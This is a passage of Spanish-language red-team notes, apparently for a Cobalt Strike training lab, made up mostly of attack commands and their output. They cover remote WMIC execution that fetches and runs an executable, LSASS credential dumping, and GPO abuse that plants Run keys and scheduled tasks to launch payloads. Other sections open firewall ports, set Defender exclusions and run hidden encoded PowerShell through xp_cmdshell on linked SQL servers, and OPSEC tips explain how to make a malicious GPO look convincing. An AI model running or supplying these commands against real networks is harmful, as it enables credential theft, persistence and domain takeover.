+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">start wmic /node<span style="color:#960050;background-color:#1e0010">:</span>@C<span style="color:#960050;background-color:#1e0010">:</span>\\share$\\comps1.txt /user<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;DOMAIN\\Administrator&#34;</span> /password<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;PASSWORD&#34;</span> <span style="color:#66d9ef">process</span> call create <span style="color:#e6db74">&#34;cmd.exe /c bitsadmin /transfer fx166 \\\\dc-2\\share$\\fx166.exe %APPDATA%\\fx166.exe &amp; %APPDATA%\\fx166.exe&#34;</span>
+
+<span style="color:#75715e">#(Dump Credentials LSSAS)</span>
+shell wmic /node<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#66d9ef">[target]</span> <span style="color:#66d9ef">process</span> call create <span style="color:#e6db74">&#34;cmd /c rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump PID C:\\ProgramData\\lsass.dmp full&#34;</span>
+
+</code></pre></div><h3 id="gpo-recon">GPO Recon</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">1. Get-DomainOU -Domain dev.cyberbotic.io -Properties Name				-&gt; List OU
+Get-DomainOU -Identity <span style="color:#e6db74">&#34;$NAME&#34;</span> 							-&gt; Retrieve Distinguishedname
+
+<span style="color:#75715e">#List computers</span>
+Get-DomainComputer -Searchbase <span style="color:#e6db74">&#34;OU=Workstations,DC=dev,DC=cyberbotic,DC=io&#34;</span>     -&gt;Properties dnshostname,name,operatingsystem
+
+<span style="color:#75715e"># List Gpos From a OU</span>
+1. Get-DomainOU -Identity <span style="color:#e6db74">&#34;$NAME&#34;</span>								-&gt; Gplink cn=*
+Get-DomainGPO -Identity <span style="color:#e6db74">&#34;{16927C64-CF83-4962-B0CF-6F90710F19C8}&#34;</span>	        -&gt; Identificar Gpo aplicadas a una OU
+
+<span style="color:#75715e"># Obtenga grupos restringidos establecidos a través de GPO, busque membresías de grupos interesantes forzadas a través del dominio</span>
+Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName, GroupName, GroupMemberOf, GroupMembers
+
+<span style="color:#75715e"># Obtenga las computadoras donde los usuarios forman parte de un grupo local a través de un grupo restringido de GPO</span>
+Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl  
+
+ObjectDN                                          ActiveDirectoryRights SecurityIdentifier                          
+--------                                          --------------------- ------------------                          
+CN=Policies,CN=System,DC=dev,DC=evilcorp,DC=local           CreateChild S-1-5-21-2697495467-513533215-122973509-1137
+
+<span style="color:#75715e"># Identificando el SID al objeto correspondiente</span>
+powershell ConvertFrom-SID <span style="color:#e6db74">&#34;S-1-5-21-2697495467-513533215-122973509-1137&#34;</span>
+
+<span style="color:#75715e">#Encuentre ACL interesantes para todo el dominio, muéstrelas en un formato legible (de izquierda a derecha)</span>
+Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName <span style="color:#f92672">-NotContains</span> <span style="color:#e6db74">&#34;DnsAdmins&#34;</span>} | ft
+</code></pre></div><h3 id="enumeration-gpo">Enumeration GPO</h3>
+<p><strong>Consulta devuelve los SID de usuario/grupo que puede crear nuevos GPO en el dominio</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell Get-DomainObjectAcl -SearchBase <span style="color:#e6db74">&#34;CN=Policies,CN=System,DC=dev,DC=evilcorp,DC=local&#34;</span> -ResolveGUIDs | ? { $_.ObjectAceType <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;Group-Policy-Container&#34;</span> } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+
+ObjectDN              <span style="color:#960050;background-color:#1e0010">:</span> CN=Policies,CN=System,DC=dev,DC=evilcorp,DC=local
+ActiveDirectoryRights <span style="color:#960050;background-color:#1e0010">:</span> CreateChild
+SecurityIdentifier    <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-2697495467-513533215-122973509-1137
+
+powershell Convert-FromSID <span style="color:#e6db74">&#34;S-1-5-21-2697495467-513533215-122973509-1137&#34;</span>
+DEV\1st line Support
+</code></pre></div><p><strong>A menudo encontrará instancias en las que los usuarios y/o grupos pueden modificar los GPO existentes.</strong></p>
+<p>Esta consulta devolverá cualquier GPO en el dominio, donde un RID de 4 dígitos tenga WriteProperty , WriteDacl o WriteOwner.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;WriteProperty|WriteDacl|WriteOwner&#34;</span> <span style="color:#f92672">-and</span> $_.SecurityIdentifier <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;S-1-5-21-2323903455-1895497758-3703895482-[\d]{4,10}&#34;</span> } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+
+ObjectDN              <span style="color:#960050;background-color:#1e0010">:</span> CN={911DBB17-FE3C-403F-9CA6-0B01E512A95C},CN=Policies,CN=System,DC=dev,DC=evilcorp,DC=local
+ActiveDirectoryRights <span style="color:#960050;background-color:#1e0010">:</span> CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
+SecurityIdentifier    <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-2697495467-513533215-122973509-1114
+
+powershell ConvertFrom-SID <span style="color:#e6db74">&#34;S-1-5-21-2697495467-513533215-122973509-1114&#34;</span>
+DEV\Developers
+</code></pre></div><p>Llegamos a la conclusion de que los usuarios del grupo <strong>&ldquo;1st line support&rdquo;</strong> pueden crear GPOS y Linkearlas a Unidades organizativas, lo que implica que tenemos un escenario para escalar privilegios rapidamente.</p>
+<p>para resolver el objeto.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell Get-DomainGPO -Name <span style="color:#e6db74">&#34;{911DBB17-FE3C-403F-9CA6-0B01E512A95C}&#34;</span>
+
+Result
+---
+displayname              <span style="color:#960050;background-color:#1e0010">:</span> Powershell Logins
+</code></pre></div><p><strong>BloodHound 🐲</strong></p>
+<p>Filter :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]-&gt;(gp)) RETURN p
+</code></pre></div><p><strong>IMPORTANTE - SE USA CON OYENTES INVERSOS TCP PARA EVITAR CONEXCIONES SALIENTES EN EL DOMINIO (PIVOT LISTENER)</strong></p>
+<p>a tener en cuenta que si :</p>
+<ul>
+<li>Si el puerto <strong>445</strong> está cerrado en el destino, no podemos usar agentes de escucha SMB.</li>
+<li>Si el <strong>firewall</strong> de destino no permite la entrada de puertos arbitrarios, no podemos usar escuchas <strong>TCP</strong>.</li>
+<li>Si la máquina actual no permite la entrada de puertos arbitrarios, no podemos usar escuchas Pivot.</li>
+</ul>
+<p><strong>⛩ Puede ser estrategicamente necesario abrir puertos en el windows de firewall para facilitar el movimiento lateral ⛩.</strong></p>
+<p>Para habilitar esta regla.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">netsh advfirewall firewall add rule name=<span style="color:#e6db74">&#34;Allow 4444&#34;</span> dir=in action=allow protocol=TCP localport=4444      -&gt; TCP
+</code></pre></div><p>Para Deshabilitar.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">netsh advfirewall firewall delete rule name=<span style="color:#e6db74">&#34;Allow 4444&#34;</span> protocol=TCP localport=4444
+</code></pre></div><h4 id="rsat--remote-server-administration-tools">Rsat  Remote Server Administration Tools</h4>
+<p>Es un componente de administracion proporcionado por microsoft para administrar componentes en un dominio, y que a menudo se encuentra en servidores y estaciones de trabajo de administracion, puede ser util.</p>
+<p>El módulo <strong>GroupPolicy</strong> tiene varios cmdlets de PowerShell que se pueden usar para administrar GPO, incluidos:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Comando</strong></th>
+<th><strong>Explanation</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>New-GPO</strong></td>
+<td>crea un nuevo GPO vacío.</td>
+</tr>
+<tr>
+<td><strong>New-GPLink</strong></td>
+<td>vincule un GPO a un sitio, dominio o unidad organizativa.</td>
+</tr>
+<tr>
+<td><strong>Set-GPPrefRegistryValue</strong></td>
+<td>configura un elemento de preferencia del registro en la configuración del equipo o del usuario.</td>
+</tr>
+<tr>
+<td><strong>Set-GPRegistryValue</strong></td>
+<td>configura una o más configuraciones de políticas basadas en el registro en la configuración del equipo o del usuario.</td>
+</tr>
+<tr>
+<td><strong>Get-GPOReport</strong></td>
+<td>genera un informe en formato XML o HTML.</td>
+</tr>
+</tbody>
+</table>
+<p>para comprobar si el modulo esta instalado podemos utilizar:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
+</code></pre></div><p>En un apuro, puede instalarlo</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Install-WindowsFeature <span style="color:#960050;background-color:#1e0010">–</span>Name GPMC  -&gt; como administrador local
+</code></pre></div><hr>
+<p>Crear y linkear una GPO a una unidad Organizativa</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell New-GPO -Name <span style="color:#e6db74">&#34;Evil GPO&#34;</span> | New-GPLink -Target <span style="color:#e6db74">&#34;OU=Workstations,DC=dev,DC=evilcorp,DC=local&#34;</span>
+
+GpoId       <span style="color:#960050;background-color:#1e0010">:</span> 3451d1c7-f482-46d3-a756-9036684aa295
+DisplayName <span style="color:#960050;background-color:#1e0010">:</span> Evil GPO
+Enabled     <span style="color:#960050;background-color:#1e0010">:</span> True
+Enforced    <span style="color:#960050;background-color:#1e0010">:</span> False
+Target      <span style="color:#960050;background-color:#1e0010">:</span> OU=Workstations,DC=dev,DC=evilcorp,DC=local
+Order       <span style="color:#960050;background-color:#1e0010">:</span> 4
+</code></pre></div><p>OPSEC 🇦🇱 : <strong>el GPO será visible en la Consola de administración de directivas de grupo y otras herramientas RSAT GPO, así que asegúrese de que el nombre sea &ldquo;convincente&rdquo;</strong></p>
+<p>Ser capaz de escribir cualquier cosa, en cualquier lugar en las colmenas <strong>HKLM o HKCU</strong> presenta diferentes opciones para lograr la ejecución del código. Una forma sencilla es crear un nuevo valor de ejecución automática para ejecutar una carga útil de Beacon en el arranque.</p>
+<p>debemos identificar donde alojar nuestro payload para que cuando las gpos se actualizen apunten a nuestro payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">beacon&gt; powershell Find-DomainShare -CheckShareAccess
+
+Name           Type Remark              ComputerName
+----           ---- ------              ------------
+software          0                     dc-2.dev.cyberbotic.io
+</code></pre></div><p>Creamos un valor de registro en nuestra GPO.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell Set-GPPrefRegistryValue -Name <span style="color:#e6db74">&#34;Evil GPO&#34;</span> -Context Computer -Action Create -Key <span style="color:#e6db74">&#34;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&#34;</span> -ValueName <span style="color:#e6db74">&#34;Updater&#34;</span> -Value <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe /c \\dc-2\software\gpo.exe&#34;</span> -Type ExpandString 
+
+<span style="color:#75715e">#fix</span>
+powershell Set-GPPrefRegistryValue -Name <span style="color:#e6db74">&#34;Evil GPO&#34;</span> -Context Computer -Action Create -Key <span style="color:#e6db74">&#34;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&#34;</span> -ValueName <span style="color:#e6db74">&#34;Updater&#34;</span> -Value <span style="color:#e6db74">&#34;%COMSPEC% /b /c start /b /min \\dc-2\software\gpo.exe&#34;</span> -Type ExpandString 
+
+DisplayName      <span style="color:#960050;background-color:#1e0010">:</span> Evil GPO
+DomainName       <span style="color:#960050;background-color:#1e0010">:</span> dev.evilcorp.local
+Owner            <span style="color:#960050;background-color:#1e0010">:</span> DEV\jking
+Id               <span style="color:#960050;background-color:#1e0010">:</span> 3451d1c7-f482-46d3-a756-9036684aa295
+GpoStatus        <span style="color:#960050;background-color:#1e0010">:</span> AllSettingsEnabled
+Description      <span style="color:#960050;background-color:#1e0010">:</span> 
+CreationTime     <span style="color:#960050;background-color:#1e0010">:</span> 16/02/2022 14<span style="color:#960050;background-color:#1e0010">:</span>41<span style="color:#960050;background-color:#1e0010">:</span>24
+ModificationTime <span style="color:#960050;background-color:#1e0010">:</span> 16/02/2022 14<span style="color:#960050;background-color:#1e0010">:</span>59<span style="color:#960050;background-color:#1e0010">:</span>58
+UserVersion      <span style="color:#960050;background-color:#1e0010">:</span> AD Version<span style="color:#960050;background-color:#1e0010">:</span> 0, SysVol Version<span style="color:#960050;background-color:#1e0010">:</span> 0
+ComputerVersion  <span style="color:#960050;background-color:#1e0010">:</span> AD Version<span style="color:#960050;background-color:#1e0010">:</span> 1, SysVol Version<span style="color:#960050;background-color:#1e0010">:</span> 1
+WmiFilter        <span style="color:#960050;background-color:#1e0010">:</span> 
+
+</code></pre></div><p>Cada máquina normalmente actualizará sus GPO automáticamente <strong>cada dos horas</strong>.</p>
+<p>Para hacerlo manualmente</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch">gpupdate /target:computer /force
+</code></pre></div><p>OPSEC 🇦🇱 : ¡También notará que esto deja un símbolo del sistema en la pantalla!
+Una mejor manera de hacerlo podría ser</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">%COMSPEC% /b /c start /b /min
+</code></pre></div><h4 id="sharpgpo-abuse-">SharpGPO Abuse 🦈</h4>
+<p><strong>SharpGPO</strong> Permite agregar una gama mas amplica de configuraciones abusivas en una gpo.
+No puede crear GPO, por lo que todavía debemos hacerlo con <strong>RSAT</strong> o modificar a la que ya tenemos acceso de escritura. En este ejemplo, agregamos una tarea programada inmediata al GPO de registro de PowerShell, que se ejecutará tan pronto como se aplique.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">
+beacon&gt; execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName <span style="color:#e6db74">&#34;Install Updates&#34;</span> --Author NT AUTHORITY\SYSTEM --Command <span style="color:#e6db74">&#34;cmd.exe&#34;</span> --Arguments <span style="color:#e6db74">&#34;/c \\dc-2\software\pivot.exe&#34;</span> --GPOName <span style="color:#e6db74">&#34;PowerShell Logging&#34;</span>
+
+[+] Domain = dev.cyberbotic.io
+[+] Domain Controller = dc-2.dev.cyberbotic.io
+[+] Distinguished Name = CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
+[+] GUID of <span style="color:#e6db74">&#34;PowerShell Logging&#34;</span> is<span style="color:#960050;background-color:#1e0010">:</span> {AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}
+[+] Creating file \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] versionNumber attribute changed successfully
+[+] The version number <span style="color:#66d9ef">in</span> GPT.ini was increased successfully.
+[+] The GPO was modified to include a new immediate task. Wait <span style="color:#66d9ef">for</span> the GPO refresh cycle.
+[+] Done!
+</code></pre></div><h4 id="enumerando-defensas-seatbelt">Enumerando Defensas SeatBelt</h4>
+<p>con seatbelt podemos enumerar la maquina remotamente, para analizar</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">execute-assembly /opt/tools/Seatbelt.exe -group=system -computername=sql-1.dev.evilcorp.local -outputfile=<span style="color:#e6db74">&#34;c:\programdata\seatbelt.txt&#34;</span>
+</code></pre></div><p><strong>la data importante se encuentra en esta salida</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">====== AppLocker ======
+[*] Applocker is not running because the AppIDSvc is not running
+
+====== LAPS ======
+LAPS Enabled                  : True
+
+====== OSInfo ======
+IsLocalAdmin                  :  False
+
+====== PowerShell ======
+Script Block Logging Settings
+Enabled                       : True
+
+====== Services ======
+Non Microsoft Services (via WMI)
+
+Name                          : Sysmon64
+BinaryPath                    : C:\Windows\Sysmon64.exe
+FileDescription               : System activity monitor
+
+====== Sysmon ======
+ERROR: Unable to collect. Must be an administrator.
+
+====== UAC ======
+[*] LocalAccountTokenFilterPolicy == 1. Any administrative local account can be used for lateral movement.
+
+====== WindowsFirewall ======
+Domain Profile
+  Enabled                  : False
+
+Private Profile
+  Enabled                  : False
+
+Public Profile
+  Enabled                  : False
+</code></pre></div><p>Enumerar el entorno del usuario <code>-group=user</code>puede ser igualmente importante. Por ejemplo, esta entrada de unidad asignada nos muestra que los elementos del perfil del usuario están montados en un recurso compartido remoto.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Mapped Drives (via WMI)
+
+  LocalName                      : H:
+  RemoteName                     : \\dc-2\home$\bfarmer
+  RemotePath                     : \\dc-2\home$\bfarmer
+  Status                         : OK
+  ConnectionState                : Connected
+  Persistent                     : False
+  UserName                       : DEV.CYBERBOTIC.IO\bfarmer
+  Description                    : RESOURCE CONNECTED - Microsoft Windows Network
+</code></pre></div><p>Algunos de los <strong>comandos de Seatbelt</strong> también se pueden ejecutar de <strong>forma remota</strong>, lo que puede ser útil para enumerar las defensas antes de saltar a él equipo</p>
+<p><strong>SeatBelt</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">execute<span style="color:#f92672">-</span>assembly C<span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span>Tools<span style="color:#960050;background-color:#1e0010">\</span>Seatbelt<span style="color:#960050;background-color:#1e0010">\</span>Seatbelt<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>Debug<span style="color:#960050;background-color:#1e0010">\</span>Seatbelt<span style="color:#f92672">.</span><span style="color:#a6e22e">exe</span> powershell <span style="color:#f92672">-</span>computername<span style="color:#f92672">=</span>srv<span style="color:#f92672">-</span>1
+</code></pre></div><h4 id="defender-exclusion">Defender Exclusion</h4>
+<pre><code>#(Checkear ruta de exclusiones del defender de manera remota)
+remoto-exec winrm dc-2 Get-MpPreference | seleccione Exclusión* 
+
+#(Parsear GPO Descargada de exclusiones)
+Parse-PolFile .\Registry.pol 
+
+KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions 
+ValueName : Exclusions_Paths 
+ValueType : REG_DWORD 
+ValueLength : 4 
+ValueData : 1 
+
+KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths 
+ValueName: C:\Windows\Temp 
+ValueType: REG_SZ 
+ValueLength: 4 
+ValueData: 0
+
+#(Configurar Ruta de exclusion)
+Set-MpPreference -ExclusionPath &quot;&lt;path&gt;&quot;
+
+</code></pre><h2 id="mssql">MSSQL</h2>
+<p>tag : #mssql
+<strong>global variables defined</strong>
+<code>SELECT @@version</code>, <code>SELECT DB_NAME()</code>, <code>SELECT @@SERVERNAME</code></p>
+<h4 id="enumeration">Enumeration</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Enumerar instancias</span>
+powershell Get-SQLInstanceDomain | Get-SQLConnectionTest
+
+ComputerName             Instance                      Status    
+------------             --------                      ------    
+sql-1.dev.evilcorp.local sql-1.dev.evilcorp.local,1433 Accessible
+
+
+<span style="color:#75715e"># Enumerar Informacion del servidor</span>
+ComputerName           <span style="color:#960050;background-color:#1e0010">:</span> sql-1.dev.evilcorp.local
+Instance               <span style="color:#960050;background-color:#1e0010">:</span> SQL-1										-&gt; Nombre de la instancia
+DomainName             <span style="color:#960050;background-color:#1e0010">:</span> DEV
+ServiceProcessID       <span style="color:#960050;background-color:#1e0010">:</span> 2640
+ServiceName            <span style="color:#960050;background-color:#1e0010">:</span> MSSQLSERVER
+ServiceAccount         <span style="color:#960050;background-color:#1e0010">:</span> sql-service@dev.evilcorp.local 			-&gt; Cuenta en la que corre el servicio
+AuthenticationMode     <span style="color:#960050;background-color:#1e0010">:</span> Windows Authentication
+ForcedEncryption       <span style="color:#960050;background-color:#1e0010">:</span> 0
+Clustered              <span style="color:#960050;background-color:#1e0010">:</span> No
+SQLServerVersionNumber <span style="color:#960050;background-color:#1e0010">:</span> 13.0.5026.0
+SQLServerMajorVersion  <span style="color:#960050;background-color:#1e0010">:</span> 2016
+SQLServerEdition       <span style="color:#960050;background-color:#1e0010">:</span> Express Edition (64-bit)
+SQLServerServicePack   <span style="color:#960050;background-color:#1e0010">:</span> SP2
+OSArchitecture         <span style="color:#960050;background-color:#1e0010">:</span> X64
+OsMachineType          <span style="color:#960050;background-color:#1e0010">:</span> ServerNT
+OSVersionName          <span style="color:#960050;background-color:#1e0010">:</span> Windows Server 2016 Standard Evaluation
+OsVersionNumber        <span style="color:#960050;background-color:#1e0010">:</span> SQL
+Currentlogin           <span style="color:#960050;background-color:#1e0010">:</span> DEV\johndoe
+IsSysadmin             <span style="color:#960050;background-color:#1e0010">:</span> Yes										-&gt; Johndoe Is Admin
+ActiveSessions         <span style="color:#960050;background-color:#1e0010">:</span> 1
+
+<span style="color:#75715e"># Enumerar Instancias Linkeadas en distintos servidores</span>
+powershell Get-SQLServerLinkCrawl -Instance <span style="color:#e6db74">&#34;sql-1.dev.evilcorp.local,1433&#34;</span>
+
+Version     <span style="color:#960050;background-color:#1e0010">:</span> SQL Server 2016 
+Instance    <span style="color:#960050;background-color:#1e0010">:</span> SQL-1
+CustomQuery <span style="color:#960050;background-color:#1e0010">:</span> 
+Sysadmin    <span style="color:#960050;background-color:#1e0010">:</span> 1
+Path        <span style="color:#960050;background-color:#1e0010">:</span> {SQL-1}
+User        <span style="color:#960050;background-color:#1e0010">:</span> DEV\johndoe
+Links       <span style="color:#960050;background-color:#1e0010">:</span> {SQL-2.SUCURSAL.EXTERNAL}								-&gt; Instancia externa en dominio diferente
+
+Version     <span style="color:#960050;background-color:#1e0010">:</span> SQL Server 2016 
+Instance    <span style="color:#960050;background-color:#1e0010">:</span> SQL-2\SQLEXPRESS
+CustomQuery <span style="color:#960050;background-color:#1e0010">:</span> 
+Sysadmin    <span style="color:#960050;background-color:#1e0010">:</span> 1
+Path        <span style="color:#960050;background-color:#1e0010">:</span> {SQL-1, SQL-2.SUCURSAL.EXTERNAL}
+User        <span style="color:#960050;background-color:#1e0010">:</span> sa
+Links       <span style="color:#960050;background-color:#1e0010">:</span> 
+
+<span style="color:#75715e"># Informacion Util</span>
+powershell Get-SQLServerLinkCrawl -Instance <span style="color:#e6db74">&#34;SQL-2.SUCURSAL.EXTERNAL&#34;</span> -Query <span style="color:#e6db74">&#34;select * from master..syslogins&#34;</span> | ft
+
+<span style="color:#75715e"># Consultas</span>
+powershell Get-SQLQuery -Instance <span style="color:#e6db74">&#34;sql-1.dev.evilcorp.local,1433&#34;</span> -Query <span style="color:#e6db74">&#34;exec xp_cmdshell &#39;net config workstation&#39;&#34;</span> 
+
+<span style="color:#75715e"># Login Impacket/MSSQLClient</span>
+proxychains python3 mssqlclient.py dev/johndoe<span style="color:#960050;background-color:#1e0010">:</span>Password1\!@10.10.40.221 -dc-ip 10.10.40.100 -windows-auth
+
+</code></pre></div><h4 id="xp_cmdshell">XP_CMDSHELL</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">#</span>(habilitando funciones avanzadas de MSSQL) 
+sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span> 
+RECONFIGURE 
+
+<span style="color:#f92672">#</span>(Habilitando xp_cmdshell) 
+sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span> 
+RECONFIGURE 
+
+<span style="color:#f92672">#</span>(Ejecutando Comandos via xp_cmshell) 
+<span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;whoami&#39;</span>; <span style="color:#66d9ef">GO</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> sys.configurations <span style="color:#66d9ef">WHERE</span> name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> ;
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> master..sysservers ;
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> OPENQUERY(<span style="color:#e6db74">&#34;SQL-1.CYBERBOTIC.IO&#34;</span>, <span style="color:#e6db74">&#39;select @@SERVERNAME&#39;</span>) ;
+
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> OPENQUERY(<span style="color:#e6db74">&#34;SQL-1.CYBERBOTIC.IO&#34;</span>, <span style="color:#e6db74">&#39;select @@SERVERNAME&#39;</span>)
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> OPENQUERY(<span style="color:#e6db74">&#34;SQL-1.CYBERBOTIC.IO&#34;</span>, <span style="color:#e6db74">&#39;select  * from sys.configurations where name = &#39;&#39;xp_cmdshell&#39;&#39; &#39;</span>)
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> OPENQUERY(<span style="color:#e6db74">&#34;SQL-1.CYBERBOTIC.IO&#34;</span>, <span style="color:#e6db74">&#39;select @@SERVERNAME ; exec xp_cmdshell &#39;&#39;powershell -nop -w hidden -enc $B64PAYLOAD&#39;&#39; &#39;</span>)
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> OPENQUERY(<span style="color:#e6db74">&#34;SQL-1.CYBERBOTIC.IO&#34;</span>, <span style="color:#e6db74">&#39;SELECT * FROM OPENQUERY(&#34;SQL01.ZEROPOINTSECURITY.LOCAL&#34;, &#39;&#39;SELECT @@SERVERNAME&#39;&#39;)&#39;</span>)
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> OPENQUERY(<span style="color:#e6db74">&#34;SQL-1.CYBERBOTIC.IO&#34;</span>, <span style="color:#e6db74">&#39;SELECT * FROM OPENQUERY(&#34;SQL01.ZEROPOINTSECURITY.LOCAL&#34;, &#39;&#39;SELECT * FROM sys.configurations WHERE name = &#39;&#39;&#39;&#39;xp_cmdshell &#39;&#39;&#39;&#39; &#39;&#39;)&#39;</span>)
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> OPENQUERY(<span style="color:#e6db74">&#34;SQL-1.CYBERBOTIC.IO&#34;</span>, <span style="color:#e6db74">&#39;select * FROM OPENQUERY(&#34;sql01.zeropintsecurity.local&#34;, &#39;&#39;SELECT @@SERVERNAME ; xp_cmdshell &#39;&#39;&#39;&#39;powershell -nop -w hidden -enc $B64PAYLOAD &#39;&#39;&#39;&#39; &#39;&#39;)&#39;</span>)
+
+</code></pre></div><h4 id="rpc-out">RPC OUT</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">
+<span style="color:#f92672">#</span> Enabling xp_cmdshell
